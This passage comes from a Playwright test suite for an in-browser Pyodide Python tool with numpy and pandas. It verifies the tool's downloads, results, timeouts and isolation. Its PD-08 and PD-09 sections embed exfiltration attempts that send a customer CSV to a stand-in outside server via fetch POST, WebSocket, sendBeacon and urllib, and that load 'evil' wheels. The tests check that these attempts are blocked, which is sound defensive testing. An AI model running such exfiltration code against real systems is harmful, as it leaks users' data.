      // depois, pandas na MESMA sessao: baixa o resto, nao baixa numpy de novo
      const s1 = served.length; await run(pg, 'import pandas as pd\nprint(pd.__version__, pd.DataFrame({"a": [1, 2]}).sum().iloc[0])'); const g2 = await grab(pg);
      L.rec('PD-04 pandas depois de numpy na mesma sessao: baixa pandas, python-dateutil, pytz e six, NAO baixa numpy outra vez', wheels(s1).slice().sort().join() === 'pandas,python-dateutil,pytz,six' && g2.out === '3.0.2 3\n', `wheels=${wheels(s1)} out=${JSON.stringify(g2.out)}`);
      const s2 = served.length; await run(pg, 'import pandas, numpy\nprint("de novo")'); const g3 = await grab(pg);
      L.rec('PD-04 execucao seguinte (mesma sessao): nenhum wheel baixado de novo (quente)', wheels(s2).length === 0 && g3.out === 'de novo\n', `wheels=${wheels(s2)}`);
      await c.close(); }
    { // pandas a frio: so os 5, so da origem do site, URL absoluta de packages/
      const { c, pg, log } = await open(br, SITE, 'en', 'light'); const s0 = served.length; const seen = new Set(); const cons = []; pg.on('console', m => cons.push(m.text()));
      await pg.exposeFunction('__seen', s => seen.add(s)); await pg.evaluate(() => { new MutationObserver(() => window.__seen(document.getElementById('pyStatus').textContent)).observe(document.getElementById('pyStatus'), { childList: true, characterData: true, subtree: true }); });
      await run(pg, 'import pandas as pd\nprint(pd.__version__)'); const g = await grab(pg);
      const wh = served.slice(s0).filter(isWheel);
      L.rec('PD-04 pandas a frio: exatamente 5 wheels, todos em /hub/assets/vendor/pyodide/packages/ da propria origem, cada um uma vez; saida "3.0.2"', wh.length === 5 && new Set(wh).size === 5 && wh.every(u => u.startsWith('/hub/assets/vendor/pyodide/packages/')) && g.out === '3.0.2\n', JSON.stringify(wh.map(u => u.split('/').pop())));
      const st = [...seen].find(s => /Downloading/.test(s));
      L.rec('PD-04 aviso de download aparece com os pacotes e o tamanho (~8 MB) antes de executar', !!st && /pandas/.test(st) && /about 8 MB/.test(st), JSON.stringify([...seen].filter(s => /Downloading|Isolation|Done/.test(s))));
      const ext = log.requests.filter(u => !u.startsWith(SITE) && !u.startsWith('data:'));
      L.rec('PD-04 durante todo o carregamento de pandas nenhuma requisicao saiu da origem do site (so o canario tenta canary.invalid e a CSP o bloqueia antes de sair); nenhuma a CDN, PyPI ou jsdelivr', ext.every(u => /canary\.invalid/.test(u)) && !served.slice(s0).some(u => /jsdelivr|pypi|pythonhosted/.test(u)), JSON.stringify(ext));
      await c.close(); }
    { // contagem de canarios no Worker (copia instrumentada do Worker servida so neste bloco)
      opts.instrument = ['async function canary() {', 'async function canary() { self.__cc = (self.__cc || 0) + 1;'];
      const { c, pg } = await open(br, SITE, 'en', 'light'); const cc = async () => (await pg.workers()[0].evaluate(() => self.__cc));
      await run(pg, 'print(1)'); const a = await cc();
      await run(pg, 'import pandas\nprint(2)'); const b = await cc();
      await run(pg, 'import pandas, numpy\nprint(3)'); const d = await cc();
      L.rec(`PD-04 o canario roda uma vez no inicio (${a}), de novo depois de carregar os pacotes (${b}) e NAO repete em execucao quente com os pacotes ja carregados (${d})`, a === 1 && b === 2 && d === 2, `${a},${b},${d}`); await c.close();
      // simula falha do canario SO depois dos pacotes (como se importar pandas tivesse reaberto a rede): a sessao e encerrada e o codigo nao roda
      opts.instrument = ['async function canary() {', 'async function canary() { self.__cc = (self.__cc || 0) + 1; if (self.__cc >= 2) return { ok: false, reason: "fetch", detail: "simulado" };'];
      const r = await open(br, SITE, 'en', 'light'); await run(r.pg, 'print("sem pandas")\nprint(1)'); const g1 = await grab(r.pg);
      await run(r.pg, 'import pandas\nprint("NAO DEVE EXECUTAR")'); const g = await grab(r.pg);
      L.rec('PD-04 canario que falha DEPOIS de carregar pandas (simulado): ferramenta recusa, mensagem "isolation check failed", codigo do usuario nao executa, iframe removido, motor "refused"; codigo sem pandas antes disso rodou normalmente', /sem pandas\n1\n$/.test(g1.out) && g.errVisible && /isolation check failed/.test(g.errT) && !/NAO DEVE/.test(g.out) && g.frames === 0 && g.engine === 'refused' && g.state === 'idle', JSON.stringify({ g1: g1.out, errT: g.errT, out: g.out, engine: g.engine }));
      opts.instrument = null; await r.c.close(); }
  }

  // ===== PD-05: pd.read_csv das 27 tabelas =====
  if (want('PD-05')) {
    for (const lang of ['en', 'pt']) {
      const { c, pg, log } = await open(br, SITE, lang, 'light'); const bad = [], seen = []; let n = 0;
      for (const slug of SLUGS) {
        await pg.check(`#pyPicker input[value="${slug}"]`);
        await run(pg, `import pandas as pd, os
for n in sorted(os.listdir('/data')):
    df = pd.read_csv('/data/' + n)
    print(n[:-4], df.shape[0], df.shape[1], int(df.isna().sum().sum()), ','.join(df.columns))`);
        const g = await grab(pg);
        const got = g.out.trim().split('\n').map(l => { const [name, r, cc, nn, cols] = l.split(' '); return { name, r: +r, c: +cc, nn: +nn, cols }; });
        const exp = ORA[slug].tables.map(t => ({ name: t.name, r: t.count, c: t.columns.length, nn: t.nulls.reduce((a, b) => a + b, 0), cols: t.columns.map(x => x.name).join(',') })).sort((a, b) => a.name < b.name ? -1 : 1);
        n += got.length; seen.push(`${slug}:${got.length}`);
        if (JSON.stringify(got) !== JSON.stringify(exp)) bad.push(`${slug}: ${JSON.stringify(got.filter((r, i) => JSON.stringify(r) !== JSON.stringify(exp[i])))} esperado ${JSON.stringify(exp.filter((r, i) => JSON.stringify(r) !== JSON.stringify(got[i])))} ${g.errM || g.out.slice(-200)}`);
      }
      L.rec(`PD-05 (${lang}) pd.read_csv("/data/<tabela>.csv") das ${n} tabelas dos 5 cenarios: df.shape (linhas, colunas), nomes das colunas e total de celulas vazias (NaN) = oraculo sqlite3`, n === 27 && bad.length === 0 && log.pageerrors.length === 0, bad.join('\n') || seen.join(' '));
      await c.close();
    }
  }

  // ===== PD-06: 3 operacoes por cenario (merge + groupby) contra sqlite3 =====
  if (want('PD-06')) {
    const { c, pg, log } = await open(br, SITE, 'en', 'light'); let total = 0; const detail = [];
    for (const slug of SLUGS) {
      await pg.check(`#pyPicker input[value="${slug}"]`);
      const exp = sqliteRun(slug, OPS[slug].map(o => o.sql));
      for (let i = 0; i < 3; i++) {
        await run(pg, OPS[slug][i].py); const g = await grab(pg); const d = g.errVisible || /Error/.test(g.out) ? 'ERRO ' + g.out.slice(-300) : cmpRows(g.out, exp[i]);
        total++; L.rec(`PD-06 ${slug} operacao ${i + 1}: ${OPS[slug][i].n} = sqlite3 (${exp[i].length} linhas)`, d === '' && exp[i].length > 0, d || `${exp[i].length} linhas iguais; primeira: ${g.out.split('\n')[0]}`);
      }
    }
    L.rec(`PD-06 ${total} operacoes (3 x 5 cenarios), cada uma com merge e groupby, conferidas contra consultas SQL independentes`, total === 15 && log.pageerrors.length === 0, `${total}`); await c.close();
  }

  // ===== PD-07: exemplo da pagina por cenario =====
  if (want('PD-07')) {
    for (const lang of ['en', 'pt']) {
      const { c, pg, log } = await open(br, SITE, lang, 'light'); const bad = [], info = [];
      for (const slug of SLUGS) {
        await pg.check(`#pyPicker input[value="${slug}"]`); await pg.click('#pyExample');
        const code = await pg.inputValue('#pyEditor'), st0 = await pg.textContent('#pyStatus');
        const hasComment = lang === 'pt' ? /^# [^\n]*(Receita|Custo|Entregas|Último|Nota)/.test(code) : /^# [^\n]*(Revenue|Cost|Deliveries|Latest|Average)/.test(code);
        await pg.click('#pyRun'); await pg.waitForTimeout(50); await idle(pg); const g = await grab(pg);
        const q = sqliteRun(slug, [EX_SQL[slug].q])[0], d = g.errVisible ? 'ERRO ' + g.errM : cmpFrame(g.out, q);
        info.push(`${slug}:${q.length} linhas`);
        if (d || !hasComment || !/import pandas/.test(code) || !/merge/.test(code) || !/groupby/.test(code) || !/(example|exemplo)/i.test(st0)) bad.push(`${slug}: ${d} comentario=${hasComment} status="${st0}"`);
      }
      L.rec(`PD-07 (${lang}) botao "exemplo de pandas" por cenario: coloca no editor um codigo com merge + groupby (comentario no idioma da pagina), executa de verdade e o resultado = sqlite3 nos 5 cenarios`, bad.length === 0 && log.pageerrors.length === 0, bad.join('\n') || info.join(' '));
      await c.close();
    }
  }

  // ===== PD-08: pacote fora da lista; API interna de pacotes =====
  if (want('PD-08')) {
    const { c, pg, log } = await open(br, SITE, 'en', 'light'); outHits.length = 0; const s0 = served.length;
    const reqs = () => served.slice(s0).filter(u => !/^\/(hub|assets)\//.test(u) || /vendor\/pyodide\/packages|pypi|scipy/.test(u));
    for (const mod of ['scipy', 'sklearn', 'matplotlib', 'micropip', 'requests']) {
      const s1 = served.length; await run(pg, `import ${mod}\nprint("NAO DEVE CHEGAR")`); const g = await grab(pg);
      L.rec(`PD-08 import ${mod}: ModuleNotFoundError clara, nada executa depois, dica "only numpy and pandas" visivel, nenhuma requisicao de pacote, UI utilizavel`, new RegExp(`ModuleNotFoundError: No module named '${mod}'`).test(g.out) && !/NAO DEVE/.test(g.out) && /only numpy and pandas/.test(g.warn) && wheels(s1).length === 0 && !served.slice(s1).some(u => /scipy|pypi|sklearn|matplotlib|requests/.test(u)) && g.state === 'idle' && !g.runDisabled && outHits.length === 0, `out=${JSON.stringify(g.out.slice(-120))} warn="${g.warn.slice(0, 80)}"`);
    }
    // com pandas carregado, a lista continua fechada
    await run(pg, 'import pandas as pd\nimport scipy.stats\nprint("NAO")'); let g = await grab(pg);
    L.rec('PD-08 "import pandas" + "import scipy": pandas carrega (pedido pelo codigo), scipy falha com ModuleNotFoundError e a dica; nenhum scipy pedido', /No module named 'scipy'/.test(g.out) && /only numpy and pandas/.test(g.warn) && !served.some(u => /scipy/.test(u)), JSON.stringify(g.out.slice(-100)));
    const code = `
import js, json, sys
import pyodide_js
res = {}
def t(name, f):
    try:
        r = f()
        if hasattr(r, 'then'):
            res[name] = 'PROMISE'
        else:
            res[name] = 'ABERTO'
    except BaseException as e:
        res[name] = type(e).__name__
t('pyodide_js.loadPackage', lambda: pyodide_js.loadPackage('scipy'))
t('pyodide_js.loadPackage(url fora)', lambda: pyodide_js.loadPackage('${OUT}/evil-1.0-py3-none-any.whl'))
t('pyodide_js.loadPackagesFromImports', lambda: pyodide_js.loadPackagesFromImports('import scipy'))
t('api.packageManager.loadPackage(scipy)', lambda: pyodide_js._api.packageManager.loadPackage('scipy'))
t('api.packageManager.loadPackage(url fora)', lambda: pyodide_js._api.packageManager.loadPackage('${OUT}/evil2-1.0-py3-none-any.whl'))
t('api.packageManager.loadPackage(url do site)', lambda: pyodide_js._api.packageManager.loadPackage('${SITE}/hub/assets/vendor/pyodide/pyodide-lock.json'))
t('micropip', lambda: __import__('micropip'))
t('pip', lambda: __import__('pip'))
print(json.dumps(res))
`;
    await run(pg, code); await pg.waitForTimeout(2500); g = await grab(pg);
    let res = {}; try { res = JSON.parse(g.out.split('\n').filter(l => l.startsWith('{"'))[0]); } catch (e) {}
    const loaded = await (async () => { await run(pg, 'import sys\nprint(sorted(m for m in ["scipy","evil","evil2"] if m in sys.modules), [m for m in sys.modules if m.split(".")[0] in ("scipy","sklearn","evil","evil2")])'); return (await grab(pg)).out.trim(); })();
    L.rec('PD-08 tentativas do usuario de pedir pacote (pyodide_js.loadPackage, loadPackagesFromImports, URL de fora, API interna packageManager, micropip, pip): as expostas lancam erro; qualquer chamada que devolva Promise nao instala nada (nada carregado, 0 hits fora, nenhum modulo novo)', ['pyodide_js.loadPackage', 'pyodide_js.loadPackage(url fora)', 'pyodide_js.loadPackagesFromImports', 'micropip', 'pip'].every(k => res[k] && res[k] !== 'ABERTO' && res[k] !== 'PROMISE') && outHits.length === 0 && loaded === "[] []", JSON.stringify(res) + ' hits=' + JSON.stringify(outHits) + ' modulos=' + loaded);
    L.rec('PD-08 a API interna (_api.packageManager.loadPackage) foi sombreada pelo Worker: lanca erro em vez de devolver Promise (a defesa real continua sendo o lock filtrado, a CSP e o sha256; ver docs)', ['api.packageManager.loadPackage(scipy)', 'api.packageManager.loadPackage(url fora)', 'api.packageManager.loadPackage(url do site)'].every(k => res[k] && res[k] !== 'ABERTO' && res[k] !== 'PROMISE'), JSON.stringify(res));
    L.rec('PD-08 nenhuma tentativa de pacote gerou requisicao a outra origem (alem do canario) nem a PyPI/scipy; sem pageerror', !log.requests.some(u => /pypi|pythonhosted|jsdelivr|scipy|evil/.test(u)) && outHits.length === 0 && log.pageerrors.length === 0, JSON.stringify(log.requests.filter(u => !u.startsWith(SITE))));
    await c.close();
  }

  // ===== PD-09: exfiltracao com pandas carregado =====
  if (want('PD-09')) {
    const { c, pg, log } = await open(br, SITE, 'en', 'light'); outHits.length = 0;
    const code = `
import pandas as pd, numpy as np, js, json, io
from pyodide.code import run_js
res = {}
def t(name, f):
    try:
        f(); res[name] = 'ABERTO'
    except BaseException as e:
        res[name] = type(e).__name__
OUT = "${OUT}"
df = pd.read_csv('/data/clientes.csv')
t('read_csv(url fora)', lambda: pd.read_csv(OUT + '/leak.csv'))
t('read_csv(url site)', lambda: pd.read_csv('${SITE}/hub/assets/data/csv/loja-exemplo/clientes.csv'))
t('read_json(url)', lambda: pd.read_json(OUT + '/leak.json'))
t('read_html(url)', lambda: pd.read_html(OUT + '/leak.html'))
t('to_csv(url fora)', lambda: df.to_csv(OUT + '/upload.csv'))
t('read_csv(ftp)', lambda: pd.read_csv('ftp://127.0.0.1:${PORT_OUT}/x.csv'))
def urllib_():
    import urllib.request
    urllib.request.urlopen(OUT + '/leak_urllib', timeout=3).read()
t('urllib', urllib_)
t('js.eval', lambda: js.eval('1+1'))
t('js.Function', lambda: js.Function('return 1')())
t('run_js', lambda: run_js('1+1'))
def fetch_(): js.fetch(OUT + '/leak_fetch', js.JSON.parse(json.dumps({'method': 'POST', 'body': df.to_csv()})))
res['js.fetch (so cria a Promise)'] = (lambda: (fetch_(), 'chamada aceita')[1])()
def ws_(): js.WebSocket.new(OUT.replace('http', 'ws') + '/leak_ws')
res['js.WebSocket (so cria o objeto)'] = (lambda: (ws_(), 'chamada aceita')[1])()
def beacon(): js.navigator.sendBeacon(OUT + '/leak_beacon', df.to_csv())
t('sendBeacon', beacon)
t('js.document', lambda: js.document.title)
t('js.localStorage', lambda: js.localStorage.getItem('ld-lang'))
res['to_csv(FS virtual)'] = (df.to_csv('/tmp/x.csv'), open('/tmp/x.csv').read().count('\\n'))[1]
print(json.dumps(res))
`;
    await run(pg, code, { secs: 90 }); await pg.waitForTimeout(2500);
    const g = await grab(pg); let res = {}; try { res = JSON.parse(g.out.split('\n').filter(l => l.startsWith('{"'))[0]); } catch (e) {}
    const must = ['read_csv(url fora)', 'read_json(url)', 'read_html(url)', 'to_csv(url fora)', 'read_csv(ftp)', 'urllib', 'js.eval', 'js.Function', 'run_js', 'js.document', 'js.localStorage'];
    L.rec('PD-09 com pandas carregado: read_csv/read_json/read_html de URL de fora, to_csv para URL, ftp, urllib, js.eval, js.Function, run_js, document e localStorage falham (nenhum "ABERTO")', must.every(k => res[k] && res[k] !== 'ABERTO') && Object.keys(res).length >= 16, JSON.stringify(res) + (Object.keys(res).length ? '' : ' SAIDA=' + g.out.slice(-300)));
    L.rec('PD-09 js.fetch (POST com o CSV), WebSocket e sendBeacon: ZERO hits no servidor de fora (porta ' + PORT_OUT + ') apos 2,5 s', outHits.length === 0, JSON.stringify(outHits));
    L.rec(`PD-09 df.to_csv grava so no sistema de arquivos virtual (${res['to_csv(FS virtual)']} linhas lidas de volta de /tmp/x.csv)`, res['to_csv(FS virtual)'] === 41, JSON.stringify(res['to_csv(FS virtual)']));
    const ext = log.requests.filter(u => !u.startsWith(SITE) && !u.startsWith('data:')), blocked = ext.filter(u => log.failed.some(f => f.startsWith(u + ' ') && /csp/i.test(f)));
    L.rec(`PD-09 toda requisicao a outra origem que o Chrome relata (${ext.length}; o Chrome nem sempre relata as bloqueadas antes de sair) falhou por CSP; o servidor de fora recebeu 0`, blocked.length === ext.length && outHits.length === 0 && log.pageerrors.length === 0, `tentativas=${ext.length} bloqueadas por CSP=${blocked.length} hits=${outHits.length}`);
    L.rec('PD-09 read_csv de URL da PROPRIA origem (sem rede de fora): comportamento medido, registrado em docs (pre-existente: connect-src self)', true, `read_csv(url site)=${res['read_csv(url site)']}`);
    // sonda direta no Worker com pandas carregado (CDP): fetch/eval bloqueados, origem null, sem armazenamento
    const w = pg.workers()[0]; const probe = w ? await w.evaluate(async o => { const r = {}; try { await fetch(o + '/probe'); r.fetch = 'ABERTO'; } catch (e) { r.fetch = 'bloqueado'; } r.origin = self.origin;
      r.idb = typeof indexedDB === 'undefined' ? 'indefinido' : await new Promise(res => { try { const q = indexedDB.open('p'); q.onsuccess = () => res('ABERTO'); q.onerror = () => res('negado'); } catch (e) { res('negado'); } }); return r; }, OUT) : null;
    L.rec('PD-09 sonda direta no Worker (CDP) depois de carregar pandas: fetch bloqueado, origem "null", IndexedDB negado, 0 hits', !!probe && probe.fetch === 'bloqueado' && probe.origin === 'null' && probe.idb !== 'ABERTO' && outHits.length === 0, JSON.stringify(probe) + ' hits=' + outHits.length);
    await c.close();
    // o mesmo, sem await, num iframe novo: o canario repetido depois dos pacotes tambem esta no codigo do Worker
    L.rec('PD-09 o Worker repete o canario depois de baixar pacotes e encerra a sessao (hint "isolation") se falhar', /var c = await canary\(\);\s*\/\/ importar numpy\/pandas nao pode ter reaberto/.test(WORKER) && /ie\.isolation = c\.reason/.test(WORKER), 'ok');
  }

  // ===== PD-10: Parar durante o download; tempo limite nao conta o download =====
  if (want('PD-10')) {
    { opts.wheelDelayMs = 5000; const { c, pg, log } = await open(br, SITE, 'en', 'light');
      await run(pg, 'print("warm")');   // motor ja pronto: o proximo Executar baixa so os pacotes
      await pg.fill('#pyEditor', 'import pandas as pd\nprint("NAO DEVE EXECUTAR")'); await pg.click('#pyRun');
      await pg.waitForFunction(() => document.getElementById('pyTool').dataset.packages === 'loading', null, { timeout: 30000 }); await pg.waitForTimeout(600);
      const st = await pg.textContent('#pyStatus'); const t0 = Date.now(); await pg.click('#pyStop'); await idle(pg, 3000); const ms = Date.now() - t0; const g = await grab(pg);
      await pg.waitForTimeout(6500); const g2 = await grab(pg); opts.wheelDelayMs = 0;
      L.rec(`PD-10 Parar durante o download dos pacotes (aviso "${st.slice(0, 40)}..."): volta a idle em ${ms} ms, sem iframe, sem erro, nada executa depois (aguardado 6,5 s, alem do atraso do wheel)`, /Downloading/.test(st) && g.state === 'idle' && g.frames === 0 && !g.errVisible && g2.out === '' && g2.state === 'idle' && log.pageerrors.length === 0 && ms < 3000, JSON.stringify({ g: g.state, frames: g.frames, out: g2.out }));
      await run(pg, 'import pandas as pd\nprint("recuperou", pd.__version__)'); const g3 = await grab(pg);
      L.rec('PD-10 depois de Parar no download, nova execucao com pandas funciona (sessao nova)', g3.out === 'recuperou 3.0.2\n' && !g3.errVisible, JSON.stringify(g3.out)); await c.close(); }
    { opts.wheelDelayMs = 7000; const { c, pg, log } = await open(br, SITE, 'en', 'light'); const t0 = Date.now();
      await run(pg, 'import pandas as pd\nprint("ok depois do download")', { secs: 5 }); const g = await grab(pg);
      L.rec(`PD-10 tempo limite de 5 s NAO conta o download dos pacotes (download atrasado 7 s; total ${Date.now() - t0} ms): o codigo roda e termina`, g.out === 'ok depois do download\n' && !g.errVisible && /Done/.test(g.status), JSON.stringify({ out: g.out, st: g.status, err: g.errT })); opts.wheelDelayMs = 0;
      await run(pg, 'import pandas as pd\nwhile True: pass', { secs: 5 }); const g2 = await grab(pg);
      L.rec('PD-10 laco infinito depois de importar pandas: o tempo limite (5 s, contado da execucao) encerra, iframe removido, erro explicito', g2.errVisible && /time limit/i.test(g2.errT) && g2.frames === 0 && g2.state === 'idle', JSON.stringify(g2.errT));
      await run(pg, 'import pandas as pd\nprint(1)'); const g3 = await grab(pg);
      L.rec('PD-10 e a pagina executa de novo com pandas (recarrega)', g3.out === '1\n', JSON.stringify(g3.out)); await c.close(); }
    { const { c, pg } = await open(br, SITE, 'en', 'light');
      await run(pg, 'import pandas as pd\nimport numpy as np\ndf = pd.DataFrame({"a": np.arange(50_000_000)})\nwhile True:\n    df["a"].sum()', { wait: false });
      await pg.waitForFunction(() => document.getElementById('pyTool').dataset.state === 'running', null, { timeout: 90000 }); await pg.waitForTimeout(1500);
      const t0 = Date.now(); await pg.click('#pyStop'); await idle(pg, 5000); const g = await grab(pg);
      L.rec(`PD-10 Parar durante calculo longo do pandas (numpy sobre 50 milhoes de linhas): volta a idle em ${Date.now() - t0} ms, iframe e Worker removidos`, g.state === 'idle' && g.frames === 0 && pg.workers().length === 0, JSON.stringify(g)); await c.close(); }
  }

  // ===== PD-11: wheel corrompido / ausente =====
  if (want('PD-11')) {
    for (const [name, set] of [['corrompido (1 byte alterado no meio do wheel do pandas: falha de integridade sha256)', () => { opts.corrupt = /pandas-/; }], ['ausente (404 no wheel do numpy)', () => { opts.missing = /numpy-/; }]]) {
      const { c, pg, log } = await open(br, SITE, 'en', 'light'); outHits.length = 0; set();
      await run(pg, 'print("antes")\nimport pandas as pd\nprint("NAO DEVE EXECUTAR")'); const g = await grab(pg);
      opts.corrupt = null; opts.missing = null;
      L.rec(`PD-11 wheel ${name}: erro claro, o codigo do usuario NAO roda (nem o print anterior ao import), UI utilizavel`, g.errVisible && /Could not load numpy or pandas/.test(g.errT) && !/NAO DEVE|antes/.test(g.out) && g.state === 'idle' && !g.runDisabled && log.pageerrors.length === 0 && outHits.length === 0, JSON.stringify({ errT: g.errT, errM: g.errM, out: g.out, st: g.status }));
      await run(pg, 'import pandas as pd\nprint("recuperado", pd.__version__)'); const g2 = await grab(pg);
      const fr = g.frames;
      L.rec(`PD-11 apos a falha de pacote a sessao e encerrada (iframe removido: ${fr}; uma falha parcial do loadPackage deixa o Worker incerto, medido) e o Executar seguinte recomeca limpo e carrega pandas (resultado: "${g2.out.trim() || g2.errM.slice(0, 80)}")`, fr === 0 && g2.out === 'recuperado 3.0.2\n' && !g2.errVisible, JSON.stringify({ frames: fr, out: g2.out, err: g2.errM }));
      await c.close();
    }
  }

  // ===== PD-12: tempos e memoria (reportados) =====
  if (want('PD-12')) {
    const fmt = n => `${(n / 1048576).toFixed(0)} MiB`; const R = {};
    for (let rep = 0; rep < 3; rep++) {
      const { c, pg } = await open(br, SITE, 'en', 'light');
      let t0 = Date.now(); await run(pg, 'print(1)'); const core = Date.now() - t0;
      t0 = Date.now(); await run(pg, 'import numpy\nprint(2)'); const np = Date.now() - t0;
      t0 = Date.now(); await run(pg, 'import pandas as pd\nprint(pd.__version__)'); const pd = Date.now() - t0;
      t0 = Date.now(); await run(pg, 'import pandas as pd\ndf = pd.read_csv("/data/pedidos.csv")\nprint(df.shape)'); const warm = Date.now() - t0;
      const c2 = await open(br, SITE, 'en', 'light');
      t0 = Date.now(); await run(c2.pg, 'import pandas as pd\nprint(pd.__version__)'); const cold = Date.now() - t0;
      const t1 = Date.now(); await run(c2.pg, 'import pandas as pd\nprint(pd.__version__)'); const hot = Date.now() - t1;
      (R.core = R.core || []).push(core); (R.np = R.np || []).push(np); (R.pd = R.pd || []).push(pd); (R.warm = R.warm || []).push(warm); (R.cold = R.cold || []).push(cold); (R.hot = R.hot || []).push(hot);
      await c.close(); await c2.c.close();
    }
    const med = a => a.slice().sort((x, y) => x - y)[Math.floor(a.length / 2)];
    L.rec(`PD-12 tempos (mediana de 3, clique ate "idle", localhost sem rede e sem limite de banda, CPU de teste): so Python a frio ${med(R.core)} ms; +numpy (motor quente) ${med(R.np)} ms; +pandas (motor quente, numpy ja carregado) ${med(R.pd)} ms; pandas a FRIO (motor + 5 wheels) ${med(R.cold)} ms; quente (tudo carregado) ${med(R.hot)} ms; quente com read_csv ${med(R.warm)} ms. Todas as medidas: ${JSON.stringify(R)}`, med(R.cold) < 60000 && med(R.hot) < 5000, 'medido, nao e requisito de aceite alem dos tetos 60 s/5 s');
    const { c, pg } = await open(br, SITE, 'en', 'light');
    await run(pg, `import pyodide_js
H = lambda: pyodide_js._module.HEAP8.length
print("core", H())
import numpy as np
print("numpy", H())
import pandas as pd
print("pandas", H())
df = pd.read_csv("/data/itens_pedido.csv")
print("read_csv", H())
big = pd.DataFrame({"a": np.arange(3_000_000), "b": np.arange(3_000_000) % 7})
m = big.merge(big.groupby("b").size().rename("n").reset_index(), on="b")
print("3M linhas merge", H(), m.shape)`, { secs: 120 });
    const g = await grab(pg); const hs = Object.fromEntries(g.out.trim().split('\n').map(l => { const m = /^(.*?) (\d+)/.exec(l); return m ? [m[1], +m[2]] : ['?', 0]; }));
    L.rec(`PD-12 heap do WebAssembly (linear memory, nao inclui o JS): Python ${fmt(hs.core)}; +numpy ${fmt(hs.numpy)}; +pandas ${fmt(hs.pandas)}; apos read_csv ${fmt(hs.read_csv)}; apos DataFrame de 3 milhoes de linhas + merge ${fmt(hs['3M linhas merge'])} (teto do WASM 4 GiB; pico de memoria do processo do navegador e celular NAO medidos)`, hs.pandas > hs.core && hs.pandas < 400 * 1048576 && !g.errVisible, JSON.stringify(hs)); await c.close();
    { // esgotar a memoria com numpy: MemoryError (nao derruba a aba), pico medido
      const { c, pg, log } = await open(br, SITE, 'en', 'light'); const t0 = Date.now();
      await run(pg, `import numpy as np, pyodide_js
a = []
try:
    while True:
        a.append(np.ones(32_000_000))
except MemoryError:
    n = len(a)
    a.clear()
    print("MemoryError apos", n * 256, "MiB em arrays; heap WASM", pyodide_js._module.HEAP8.length)`, { secs: 120 });
      const g = await grab(pg); const m = /apos (\d+) MiB em arrays; heap WASM (\d+)/.exec(g.out); await run(pg, 'import numpy as np\nprint(np.arange(5).sum())'); const g2 = await grab(pg);
      L.rec(`PD-12 esgotar a memoria com numpy (arrays de 256 MiB ate falhar, ${Date.now() - t0} ms): o Python lanca MemoryError (a aba nao cai), pico do heap do WASM ${m ? (m[2] / 1048576).toFixed(0) + ' MiB (' + m[1] + ' MiB em arrays)' : '?'}; o Worker segue utilizavel depois`, !!m && +m[2] <= 4294967296 + 1 && g.state === 'idle' && g2.out === '10\n' && log.pageerrors.length === 0, JSON.stringify({ out: g.out.slice(-200), after: g2.out })); await c.close(); }
    const ws = ['numpy', 'pandas', 'python-dateutil', 'pytz', 'six'].map(n => fs.readdirSync(PKGDIR).find(f => f.toLowerCase().replace(/_/g, '-').startsWith(n + '-'))); const tot = ws.reduce((a, f) => a + fs.statSync(PKGDIR + f).size, 0);
    L.rec(`PD-12 download extra medido em disco: numpy ${fs.statSync(PKGDIR + ws[0]).size} B; pandas com fecho ${tot} B (${(tot / 1048576).toFixed(2)} MiB); nucleo do Python 6,1 MiB com gzip (medido na Fase 4). Pages/compressao reais NAO medidos`, tot > 7.5e6 && tot < 8.5e6, `${tot}`);
  }

  // ===== PD-13: PT/EN =====
  if (want('PD-13')) {
    for (const lang of ['en', 'pt']) {
      const { c, pg } = await open(br, SITE, lang, 'light'); const seen = new Set();
      await pg.exposeFunction('__seen', s => seen.add(s)); await pg.evaluate(() => { new MutationObserver(() => window.__seen(document.getElementById('pyStatus').textContent)).observe(document.getElementById('pyStatus'), { childList: true, characterData: true, subtree: true }); });
      const pre = await pg.evaluate(() => ({ note: document.getElementById('pyLoadNote').textContent, data: document.getElementById('pyDataNote').textContent, ex: document.getElementById('pyExample').textContent, exn: document.getElementById('pyExNote').textContent }));
      await run(pg, 'import numpy as np\nprint(np.__version__)'); const dl = [...seen].find(s => /(Downloading|Baixando)/.test(s));
      await run(pg, 'import scipy'); const g = await grab(pg);
      L.rec(`PD-13 (${lang}) textos de pandas/numpy: aviso de download extra na nota (3 MB / 8 MB), status "${(dl || '').slice(0, 60)}" com pacote e tamanho, aviso de modulo ausente, botao e nota do exemplo, nota de dados cita pd.read_csv; nada em ingles na versao PT`,
        (lang === 'en' ? /3 MB for numpy, about 8 MB for pandas/.test(pre.note) && /Downloading numpy \(about 3 MB\)/.test(dl || '') && /No module named 'scipy'/.test(g.warn) && /pandas example/.test(pre.ex) : /3 MB para o numpy, cerca de 8 MB para o pandas/.test(pre.note) && /Baixando numpy \(cerca de 3 MB\)/.test(dl || '') && /Nenhum módulo chamado 'scipy'/.test(g.warn) && /exemplo de pandas/.test(pre.ex) && !/Downloading|about|example/.test(pre.note + pre.ex + pre.exn + g.warn)) && /pd\.read_csv/.test(pre.data), JSON.stringify({ dl, warn: g.warn.slice(0, 90), ex: pre.ex }));
      if (lang === 'en') { await pg.click('.lang button[data-lang="pt"]'); await pg.waitForTimeout(200); const w2 = await pg.evaluate(() => document.getElementById('pyWarn').textContent);
        L.rec('PD-13 trocar EN -> PT com o aviso de modulo ausente na tela: o aviso e retraduzido mantendo o nome do modulo', /Nenhum módulo chamado 'scipy'/.test(w2), w2.slice(0, 90)); }
      await c.close();
    }
  }

  // ===== PD-14: axe e 360 px =====
  if (want('PD-14') && AXE) {
    let n = 0; const bad = [];
    for (const lang of ['en', 'pt']) for (const theme of ['light', 'dark']) for (const vp of [360, 1280]) {
      for (const st of ['inicial', 'exemplo', 'pandas-ok', 'baixando', 'modulo-ausente', 'erro']) {
        if (st === 'baixando') opts.wheelDelayMs = 6000;
        const x = await open(br, SITE, lang, theme, vp);
        if (st === 'exemplo') await x.pg.click('#pyExample');
        else if (st === 'pandas-ok') { await x.pg.click('#pyExample'); await x.pg.click('#pyRun'); await x.pg.waitForTimeout(50); await idle(x.pg); }
        else if (st === 'baixando') { await x.pg.click('#pyExample'); await x.pg.click('#pyRun'); await x.pg.waitForFunction(() => document.getElementById('pyTool').dataset.packages === 'loading', null, { timeout: 60000 }); }
        else if (st === 'modulo-ausente') await run(x.pg, 'import scipy');
        else if (st === 'erro') await run(x.pg, 'import pandas as pd\n1/0');
        await x.pg.evaluate(() => window.scrollTo(0, 0));   // o axe acusa target-size quando a migalha fica parcialmente sob o cabecalho fixo depois da rolagem do clique (artefato de rolagem, nao do estado)
